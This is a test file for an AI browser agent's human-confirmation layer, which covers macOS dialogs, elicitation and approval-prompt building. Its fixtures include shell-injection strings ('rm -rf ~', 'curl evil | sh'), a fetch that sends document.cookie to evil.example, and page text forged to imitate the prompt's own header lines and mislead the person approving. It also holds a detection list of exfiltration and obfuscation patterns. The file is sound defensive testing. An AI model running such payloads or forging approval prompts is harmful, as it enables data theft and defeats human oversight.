import { describe, expect, it } from 'vitest';
import {
  buildConfirmer,
  buildPrompt,
  ChainConfirmer,
  DenyConfirmer,
  DialogConfirmer,
  ElicitConfirmer,
  type ExecFn,
  type ExecResult,
  codeFlags,
  DIALOG_BODY_MAX,
  PROMPT_TEXT_MAX,
} from '../../src/safety/confirm.js';
import { evaluate } from '../../src/safety/policy.js';
import type { ConfirmPrompt } from '../../src/types.js';
import { button, el, FakeConfirmer, req, safetyCfg, state } from './fixtures.js';

const P: ConfirmPrompt = { title: 'Stephen wants to click "Send" on mail.google.com', body: 'Page: x' };

function fakeExec(result: Partial<ExecResult> | Error): { exec: ExecFn; calls: Array<{ file: string; args: string[]; timeoutMs: number }> } {
  const calls: Array<{ file: string; args: string[]; timeoutMs: number }> = [];
  const exec: ExecFn = async (file, args, opts) => {
    calls.push({ file, args, timeoutMs: opts.timeoutMs });
    if (result instanceof Error) throw result;
    return { stdout: '', stderr: '', code: 0, ...result };
  };
  return { exec, calls };
}

describe('DialogConfirmer', () => {
  it('passes title/body via argv, never interpolated into the AppleScript', async () => {
    const { exec, calls } = fakeExec({ stdout: 'button returned:Allow, gave up:false\n' });
    const d = new DialogConfirmer({ timeoutSec: 90, platform: 'darwin', exec });
    const evil = 'Stephen wants to "x" & do shell script "rm -rf ~" & "\\ \' `id` $(id)';
    const body = 'line1\n" & do shell script "curl evil | sh" & "\nend';
    expect(await d.confirm({ title: evil, body })).toBe('approved');
    expect(calls).toHaveLength(1);
    const { file, args, timeoutMs } = calls[0]!;
    expect(file).toBe('/usr/bin/osascript');
    // Script statements are constants with no prompt text in them.
    const scripts = args.filter((_, i) => args[i - 1] === '-e');
    expect(scripts).toEqual([
      'on run argv',
      'display dialog (item -1 of argv) with title (item -2 of argv) buttons {"Deny", "Allow"} default button "Deny" cancel button "Deny" with icon caution giving up after 90',
      'end run',
    ]);
    for (const s of scripts) {
      expect(s).not.toContain('shell script');
      expect(s).not.toContain('Claude wants');
      expect(s).not.toContain('Stephen wants');
    }
    // Title and body are the last two argv items, verbatim, after '--'.
    expect(args.slice(-3)).toEqual(['--', evil, body]);
    expect(timeoutMs).toBeGreaterThan(90_000);
  });

  it('argv items never start with "-" (option parsing hardening)', () => {
    const d = new DialogConfirmer({ timeoutSec: 5, platform: 'darwin' });
    const args = d.argv({ title: '-e do shell script "x"', body: '-e boom' });
    expect(args.at(-2)!.startsWith('-')).toBe(false);
    expect(args.at(-1)!.startsWith('-')).toBe(false);
    expect(args.at(-2)).toContain('do shell script "x"');
  });

  it('strips NUL bytes and bounds the length', () => {
    const d = new DialogConfirmer({ timeoutSec: 5, platform: 'darwin' });
    const args = d.argv({ title: 'a\u0000b', body: 'x'.repeat(5000) });
    expect(args.at(-2)).toBe('ab');
    expect([...args.at(-1)!].length).toBeLessThanOrEqual(DIALOG_BODY_MAX);
  });

  it('#6: a body too long to show in full is declined, never truncated and shown', async () => {
    const { exec, calls } = fakeExec({ stdout: 'button returned:Allow' });
    const d = new DialogConfirmer({ timeoutSec: 5, platform: 'darwin', exec });
    expect(await d.confirm({ title: 't', body: 'x'.repeat(DIALOG_BODY_MAX + 1) })).toBe('declined');
    expect(calls).toHaveLength(0);
    // a full 2000-char evaluate prompt fits
    const r = req({ kind: 'evaluate', text: `/*${'x'.repeat(1990)}*/ 1` });
    const prompt = buildPrompt(r, evaluate(r, state({ safety: safetyCfg({ allowEvaluate: true }) })));
    expect([...prompt.body].length).toBeLessThanOrEqual(DIALOG_BODY_MAX);
    expect(await d.confirm(prompt)).toBe('approved');
    expect(calls[0]!.args.at(-1)).toContain('x'.repeat(1990));
  });

  it('sanitizes a bogus timeout to a safe integer', () => {
    const d = new DialogConfirmer({ timeoutSec: Number.NaN, platform: 'darwin' });
    expect(d.argv(P).join(' ')).toContain('giving up after 120');
  });

  it.each<[string, Partial<ExecResult> | Error, string]>([
    ['Allow', { stdout: 'button returned:Allow, gave up:false' }, 'approved'],
    ['Deny (cancel button → -128)', { code: 1, stderr: 'execution error: User canceled. (-128)' }, 'declined'],
    ['gave up', { stdout: 'button returned:, gave up:true' }, 'declined'],
    ['killed by timeout', { code: null }, 'declined'],
    ['garbage output', { stdout: 'what' }, 'declined'],
    ['exec throws', new Error('boom'), 'declined'],
    ['osascript missing', { code: null, spawnError: true }, 'unavailable'],
    ['no GUI session', { code: 1, stderr: 'execution error: No user interaction allowed. (-1713)' }, 'unavailable'],
  ])('%s → %s', async (_l, result, outcome) => {
    const { exec } = fakeExec(result);
    expect(await new DialogConfirmer({ timeoutSec: 10, platform: 'darwin', exec }).confirm(P)).toBe(outcome);
  });

  it('non-darwin → unavailable without running anything', async () => {
    const { exec, calls } = fakeExec({ stdout: 'button returned:Allow' });
    expect(await new DialogConfirmer({ timeoutSec: 10, platform: 'linux', exec }).confirm(P)).toBe('unavailable');
    expect(calls).toHaveLength(0);
  });
});

describe('ElicitConfirmer', () => {
  it.each<['accept' | 'decline' | 'cancel', string]>([
    ['accept', 'approved'],
    ['decline', 'declined'],
    ['cancel', 'declined'],
  ])('%s → %s', async (answer, outcome) => {
    expect(await new ElicitConfirmer(async () => answer).confirm(P)).toBe(outcome);
  });
  it('throws → unavailable', async () => {
    expect(
      await new ElicitConfirmer(async () => {
        throw new Error('client does not support elicitation');
      }).confirm(P),
    ).toBe('unavailable');
  });
  it('no answer before the timeout → declined', async () => {
    const never = () => new Promise<'accept'>(() => undefined);
    expect(await new ElicitConfirmer(never, 20).confirm(P)).toBe('declined');
  });
  it('passes the prompt through', async () => {
    let seen: ConfirmPrompt | null = null;
    await new ElicitConfirmer(async (p) => {
      seen = p;
      return 'decline';
    }).confirm(P);
    expect(seen).toEqual(P);
  });
});

describe('DenyConfirmer / ChainConfirmer', () => {
  it('deny always declines', async () => {
    expect(await new DenyConfirmer().confirm()).toBe('declined');
  });
  it('first non-unavailable answer wins', async () => {
    const a = new FakeConfirmer('unavailable');
    const b = new FakeConfirmer('declined');
    const c = new FakeConfirmer('approved');
    expect(await new ChainConfirmer([a, b, c]).confirm(P)).toBe('declined');
    expect(a.prompts).toHaveLength(1);
    expect(c.prompts).toHaveLength(0);
  });
  it('throwing confirmers are skipped as unavailable', async () => {
    const boom = new FakeConfirmer(async () => {
      throw new Error('x');
    });
    expect(await new ChainConfirmer([boom, new FakeConfirmer('approved')]).confirm(P)).toBe('approved');
  });
  it('all unavailable / empty → unavailable', async () => {
    expect(await new ChainConfirmer([new FakeConfirmer('unavailable')]).confirm(P)).toBe('unavailable');
    expect(await new ChainConfirmer([]).confirm(P)).toBe('unavailable');
  });
});

describe('buildConfirmer modes', () => {
  const allow = fakeExec({ stdout: 'button returned:Allow, gave up:false' });
  it("auto with elicit → elicit answers first, dialog not used", async () => {
    const { exec, calls } = fakeExec({ stdout: 'button returned:Allow' });
    const c = buildConfirmer(safetyCfg({ confirm: 'auto' }), { elicit: async () => 'decline', platform: 'darwin', exec });
    expect(await c.confirm(P)).toBe('declined');
    expect(calls).toHaveLength(0);
  });
  it('auto, elicit fails → falls back to the macOS dialog', async () => {
    const c = buildConfirmer(safetyCfg({ confirm: 'auto' }), {
      elicit: async () => {
        throw new Error('nope');
      },
      platform: 'darwin',
      exec: allow.exec,
    });
    expect(await c.confirm(P)).toBe('approved');
  });
  it('auto without elicit on Linux → unavailable', async () => {
    expect(await buildConfirmer(safetyCfg({ confirm: 'auto' }), { platform: 'linux' }).confirm(P)).toBe('unavailable');
  });
  it("'elicit' without an elicit fn → unavailable; never uses the dialog", async () => {
    const { exec, calls } = fakeExec({ stdout: 'button returned:Allow' });
    expect(await buildConfirmer(safetyCfg({ confirm: 'elicit' }), { platform: 'darwin', exec }).confirm(P)).toBe('unavailable');
    expect(calls).toHaveLength(0);
  });
  it("'dialog' ignores elicit", async () => {
    let asked = false;
    const c = buildConfirmer(safetyCfg({ confirm: 'dialog' }), {
      elicit: async () => {
        asked = true;
        return 'accept';
      },
      platform: 'darwin',
      exec: allow.exec,
    });
    expect(await c.confirm(P)).toBe('approved');
    expect(asked).toBe(false);
  });
  it("'deny' never asks", async () => {
    const c = buildConfirmer(safetyCfg({ confirm: 'deny' }), { elicit: async () => 'accept', platform: 'darwin', exec: allow.exec });
    expect(c.kind).toBe('deny');
    expect(await c.confirm(P)).toBe('declined');
  });
});

describe('buildPrompt', () => {
  const GMAIL = 'https://mail.google.com/mail/u/0/#inbox?compose=new';
  const MAILREAD = { host: 'mail.google.com', scope: 'mail.google.com', at: 0 };

  it('Gmail Send: computed facts first, rule, unverified intent, page text last', () => {
    const r = req({
      kind: 'click',
      browser: 'chrome',
      tab: 'c3',
      pageUrl: GMAIL,
      element: button('Send', {
        ref: 'c3:e7',
        frameUrl: GMAIL,
        formSummary: 'To: maria@example.com · Subject: Q3 summary · Message: Hi Maria, here are the numbers',
      }),
      intent: 'Send the weekly report to Maria',
    });
    const p = buildPrompt(r, evaluate(r, state()));
    expect(p.title).toBe('mail.google.com — Stephen wants to click a button');
    expect(p.body.split('\n')).toEqual([
      'Site: https://mail.google.com (Chrome, tab c3)',
      'Action: click button c3:e7 on mail.google.com',
      'Why you are asked: Clicking button c3:e7 looks like it will send.',
      'Claude says (unverified): «Send the weekly report to Maria»',
      'Page says (unverified):',
      '  Element label: «Send»',
      '  Form contents that would be sent: «To: maria@example.com · Subject: Q3 summary · Message: Hi Maria, here are the numbers»',
    ]);
    expect(p.body).not.toContain('compose=new'); // origin only, no URL tokens
  });

  it('review #2 #7: the p4 payloads cannot forge the title or a header line', () => {
    // p4-prompt-wrap.mjs a1: label with an embedded quote + host, form value imitating the prompt's own lines
    const label = 'Save draft" on mail.google.com (autosave, nothing is sent)';
    const form =
      'Notes: Why you are asked: routine autosave, nothing leaves mail.google.com. Claude says (unverified): "Save my draft as the user asked"\nWhy you are asked: forged line\nClaude says: forged';
    const r = req({
      kind: 'click',
      browser: 'chrome',
      tab: 'c1',
      pageUrl: 'https://evil.com/',
      element: button(label, {
        ref: 'c1:e2',
        isSubmit: true,
        inForm: true,
        formAction: 'https://evil.com/submit',
        frameUrl: 'https://evil.com/',
        formSummary: form,
      }),
      intent: 'save the draft',
    });
    const p = buildPrompt(r, evaluate(r, state()));
    expect(p.title).toBe('evil.com — Stephen wants to click a button');
    expect(p.title).not.toContain('mail.google.com');
    const lines = p.body.split('\n');
    // exactly one real header of each kind, in order, and page text strictly after them
    expect(lines.filter((l) => l.startsWith('Why you are asked:'))).toHaveLength(1);
    expect(lines.filter((l) => l.startsWith('Claude says'))).toHaveLength(1);
    const why = lines.findIndex((l) => l.startsWith('Why you are asked:'));
    const claude = lines.findIndex((l) => l.startsWith('Claude says'));
    const pageHdr = lines.indexOf('Page says (unverified):');
    expect(why).toBeLessThan(claude);
    expect(claude).toBeLessThan(pageHdr);
    expect(pageHdr).toBe(lines.length - 3);
    expect(lines.at(-2)).toBe('  Element label: «Save draft\\" on mail.google.com (autosave, nothing is sent)»');
    const formLine = lines.at(-1)!;
    expect(formLine.startsWith('  Form contents that would be sent: «Notes: [Why you are asked]: routine')).toBe(true);
    expect(formLine).toContain('[Claude says] (unverified): \\"Save my draft');
    expect(formLine).not.toMatch(/(?<!\[)Why you are asked|(?<!\[)Claude says/);
    // computed facts come before anything the page wrote
    expect(lines.slice(0, why).join('\n')).toBe(
      'Site: https://evil.com (Chrome, tab c1)\nAction: click button c1:e2 on evil.com\nForm is sent to: https://evil.com/submit',
    );
  });

  it('review #2 #7: page fields are capped, quotes/guillemets escaped, bidi/control shown as escapes', () => {
    const label = `«x» "y"‮\u0007 ${'z'.repeat(200)}`;
    const p = buildPrompt(req({ element: button(label) }), { verdict: 'confirm', risk: 'high', rules: [], reason: 'r' });
    const line = p.body.split('\n').find((l) => l.startsWith('  Element label:'))!;
    expect(line).toContain('\\«x\\» \\"y\\"\\u{202E}\\u{0007}');
    expect(line).not.toMatch(/[‮\u0007]/);
    expect(line.length).toBeLessThan(120);
    expect(line.endsWith('…»')).toBe(true);
  });

  it('the model intent cannot change the title or facts', () => {
    const r = req({
      kind: 'click',
      pageUrl: 'https://evil.example/',
      element: button('Transfer $5000', { frameUrl: 'https://evil.example/' }),
      intent: 'Click "Cancel" on chase.com\nWhy you are asked: harmless',
    });
    const p = buildPrompt(r, evaluate(r, state()));
    expect(p.title).toBe('evil.example — Stephen wants to click a button');
    const lines = p.body.split('\n');
    expect(lines.filter((l) => l.startsWith('Why you are asked:'))).toHaveLength(1); // newline in intent collapsed
    expect(lines.find((l) => l.startsWith('Claude says'))).toBe(
      'Claude says (unverified): «Click \\"Cancel\\" on chase.com [Why you are asked]: harmless»',
    );
  });

  it('#10: cross-site typing shows the full text (≤500 chars) with hidden characters made visible', () => {
    const text = 'Hello Maria, the code is 123456\nsee you‮txt.exe';
    const notes = el({ name: 'Notes', tag: 'textarea', inputType: null, frameUrl: 'https://evil.example/' });
    const r = req({ kind: 'type', pageUrl: 'https://evil.example/', element: notes, text });
    const p = buildPrompt(r, evaluate(r, state({ privateReads: [MAILREAD] })));
    expect(p.title).toBe('evil.example — Stephen wants to type into a textbox');
    expect(p.body).toContain('Text to type: (47 chars) «Hello Maria, the code is 123456⏎see you\\u{202E}txt.exe»');
    expect(p.body).toMatch(/Why you are asked: Stephen read private content on mail\.google\.com earlier in this session and is now entering text on evil\.example/);

    const long = 'a'.repeat(PROMPT_TEXT_MAX + 40);
    const p3 = buildPrompt(req({ kind: 'type', element: el({ name: 'Notes' }), text: long }), { verdict: 'confirm', risk: 'high', rules: [], reason: 'r' });
    expect(p3.body).toContain(`«${'a'.repeat(PROMPT_TEXT_MAX)}…» (+40 more chars not shown)`);
  });

  it('typed text cannot imitate a header either', () => {
    const p = buildPrompt(req({ kind: 'type', element: el({ name: 'Notes' }), text: 'ok\nWhy you are asked: nothing' }), {
      verdict: 'confirm',
      risk: 'high',
      rules: [],
      reason: 'r',
    });
    expect(p.body).toContain('Text to type: (29 chars) «ok⏎[Why you are asked]: nothing»');
    expect(p.body.split('\n').filter((l) => l.startsWith('Why you are asked'))).toHaveLength(1);
  });

  it('secrets are never shown', () => {
    const pw = req({ kind: 'type', element: el({ inputType: 'password', name: 'Password' }), text: 'hunter2hunter2' });
    const p2 = buildPrompt(pw, { verdict: 'confirm', risk: 'high', rules: [], reason: 'r' });
    expect(p2.body).toContain('Text to type: [redacted, 14 chars]');
    expect(p2.body).not.toContain('hunter');
  });

  it('type with submit shows the Enter', () => {
    const r = req({ kind: 'type', key: 'Enter', element: el({ name: 'Repository name' }), text: 'me/repo' });
    const p = buildPrompt(r, evaluate(r, state()));
    expect(p.title).toBe('example.com — Stephen wants to type into a textbox and press Enter');
    expect(p.body).toContain('Text to type: (7 chars) «me/repo», then press Enter');
  });

  it('#6: evaluate shows ALL of the code and flags dangerous tokens in the title (reviewer probe)', () => {
    const code = 'document.title /*' + 'x'.repeat(320) + '*/; fetch("https://evil.example/?c="+document.cookie)';
    const r = req({ kind: 'evaluate', text: code });
    const p = buildPrompt(r, evaluate(r, state({ safety: safetyCfg({ allowEvaluate: true }) })));
    expect(p.title).toBe('example.com — Stephen wants to run JavaScript (uses fetch, document.cookie)');
    expect(p.body).toContain(`│ ${code}`);
    expect(p.body).toContain(`Code (all ${code.length} chars, each line marked │):`);
    expect(p.body).toContain('Warning: the code uses fetch, document.cookie.');
  });

  it('code lines are marked so code cannot start a header line', () => {
    const r = req({ kind: 'evaluate', text: '1\nWhy you are asked: harmless\nClaude says (unverified): «ok»' });
    const p = buildPrompt(r, { verdict: 'confirm', risk: 'high', rules: [], reason: 'r' });
    const lines = p.body.split('\n');
    expect(lines).toContain('│ Why you are asked: harmless');
    expect(lines.filter((l) => l.startsWith('Why you are asked'))).toHaveLength(1);
    expect(lines.filter((l) => l.startsWith('Claude says'))).toHaveLength(1);
  });

  it.each([
    ['fetch("/x")', 'fetch'],
    ['new XMLHttpRequest()', 'XMLHttpRequest'],
    ['navigator.sendBeacon(u, d)', 'sendBeacon'],
    ['new WebSocket(u)', 'WebSocket'],
    ['document.cookie', 'document.cookie'],
    ['localStorage.getItem("t")', 'storage'],
    ['import("https://x/m.js")', 'import()'],
    ['eval(s)', 'eval'],
    ['Function("return 1")()', 'Function()'],
    ['[].constructor.constructor("x")()', 'Function()'],
    ['location = "https://x/?" + d', 'location='],
    ['location.href = u', 'location='],
    ['window.open(u)', 'window.open'],
    ['parent.postMessage(d, "*")', 'postMessage'],
    ['new Image().src = u', 'loads a URL (src/href)'],
    ['document.forms[0].submit()', 'form submit'],
    ['window["fe"+"tch"](u)', 'obfuscation'],
    ['atob("ZmV0Y2g=")', 'obfuscation'],
    ['"\\x66etch"', 'obfuscation'],
    ['/* \u202E */ 1', 'hidden/bidi characters'],
  ])('codeFlags(%s) includes %s', (code, flag) => {
    expect(codeFlags(code)).toContain(flag);
  });
  it('codeFlags is quiet for plain DOM reads', () => {
    expect(codeFlags('document.title')).toEqual([]);
    expect(codeFlags('[...document.querySelectorAll("h2")].map(h => h.textContent)')).toEqual([]);
  });
  it('hidden characters in code are shown as escapes, line breaks kept', () => {
    const r = req({ kind: 'evaluate', text: 'let a = 1;\n/*‮*/ a' });
    const p = buildPrompt(r, { verdict: 'confirm', risk: 'high', rules: [], reason: 'r' });
    expect(p.body).toContain('│ let a = 1;\n│ /*\\u{202E}*/ a');
    expect(p.title).toMatch(/hidden\/bidi characters/);
  });

  it('upload, navigate, dialog, link and press prompts carry their facts', () => {
    const d = { verdict: 'confirm' as const, risk: 'high' as const, rules: [], reason: 'because' };
    const up = buildPrompt(req({ kind: 'upload', element: el({ inputType: 'file', name: 'Attach' }), files: ['/Users/me/a.pdf', '/Users/me/b.png'] }), d);
    expect(up.title).toBe('example.com — Stephen wants to upload 2 files');
    expect(up.body).toContain('Files: «/Users/me/a.pdf», «/Users/me/b.png»');

    const target = `https://script.google.com/macros/s/ATTACKER/exec?d=${'Q'.repeat(300)}`;
    const nav = buildPrompt(req({ kind: 'navigate', targetUrl: target }), d);
    expect(nav.title).toBe('example.com — Stephen wants to open script.google.com');
    expect(nav.body).toContain(`Destination (full URL): ${target}`);

    const homoglyph = buildPrompt(req({ kind: 'tab_open', pageUrl: 'about:blank', targetUrl: 'https://pаypal.com/' }), d);
    expect(homoglyph.title).toBe('about:blank — Stephen wants to open xn--pypal-4ve.com');

    const dlg = buildPrompt(req({ kind: 'dialog', dialog: { type: 'prompt', message: 'Enter the new forwarding address', accept: true }, text: 'attacker@evil.example' }), d);
    expect(dlg.title).toBe('example.com — Stephen wants to accept a prompt dialog');
    expect(dlg.body).toContain('Dialog type: prompt');
    expect(dlg.body).toContain('Text Stephen will enter: (21 chars) «attacker@evil.example»');
    expect(dlg.body.split('\n').at(-1)).toBe('  Dialog message: «Enter the new forwarding address»');

    const link = buildPrompt(req({ element: button('Open', { role: 'link', tag: 'a', href: 'https://evil.example/?d=secret' }) }), d);
    expect(link.body).toContain('Link goes to: https://evil.example/?d=secret');

    const key = buildPrompt(req({ kind: 'press', key: 'Meta+Enter', focus: 'element', element: el({ tag: 'div', role: 'textbox', name: 'Message Bob' }) }), d);
    expect(key.title).toBe('example.com — Stephen wants to press Meta+Enter');
    expect(key.body).toContain('Focused element: textbox z1:e1');
    expect(key.body).toContain('  Element label: «Message Bob»');
    expect(key.body).toContain('Key: Meta+Enter');
    const none = buildPrompt(req({ kind: 'press', key: 'Delete', focus: 'none' }), d);
    expect(none.body).toContain('Focused element: none (page body)');
  });

  it('review #2 #4: a paste prompt says the clipboard goes to the page host', () => {
    const r = req({ kind: 'press', key: 'Meta+V', focus: 'element', pageUrl: 'https://evil.com/', element: button('Go', { frameUrl: 'https://evil.com/' }) });
    const p = buildPrompt(r, evaluate(r, state()));
    expect(p.title).toBe('evil.com — Stephen wants to paste your clipboard into this page');
    expect(p.body).toContain('Clipboard: everything on your clipboard will be given to evil.com.');
    expect(p.body).toMatch(/Why you are asked: Pasting gives the clipboard contents to evil\.com/);
  });

  it('review #2 #6: the first-interaction question is the title when it is the only rule', () => {
    const r = req({ kind: 'scroll', pageUrl: 'https://example.com/' });
    const d = evaluate(r, state({ privateReads: [MAILREAD] }));
    expect(d.rules).toEqual(['first-interaction']);
    const p = buildPrompt(r, d, { trustHosts: ['example.com'], readSources: 'mail.google.com' });
    expect(p.title).toBe('Stephen has read private content (mail.google.com). Allow it to interact with example.com for the rest of this session?');
    expect(p.body).toContain('Approving lets Stephen interact with example.com for the rest of this session without asking again.');
    // combined with another rule: the action stays the title, the grant is spelled out in the body
    const c = req({ pageUrl: 'https://example.com/', element: button('Send', { frameUrl: 'https://example.com/' }) });
    const dc = evaluate(c, state({ privateReads: [MAILREAD] }));
    const pc = buildPrompt(c, dc, { trustHosts: ['example.com'], readSources: 'mail.google.com' });
    expect(pc.title).toBe('example.com — Stephen wants to click a button');
    expect(pc.body).toContain('Approving also lets Stephen interact with example.com for the rest of this session without asking again.');
  });

  it('strips control/bidi characters from labels and bounds the title', () => {
    const name = `Se\u202End\u0000${'x'.repeat(300)}`;
    const p = buildPrompt(req({ element: button(name), intent: `a\u0007b${'y'.repeat(500)}` }), {
      verdict: 'confirm',
      risk: 'high',
      rules: [],
      reason: 'r',
    });
    expect(p.title).not.toMatch(/[\u0000-\u001f\u202e]/);
    expect([...p.title].length).toBeLessThanOrEqual(200);
    expect(p.body).not.toMatch(/[\u0000\u0007\u202e]/);
    const intentLine = p.body.split('\n').find((l) => l.startsWith('Claude says'))!;
    expect(intentLine.length).toBeLessThan(260);
  });
});
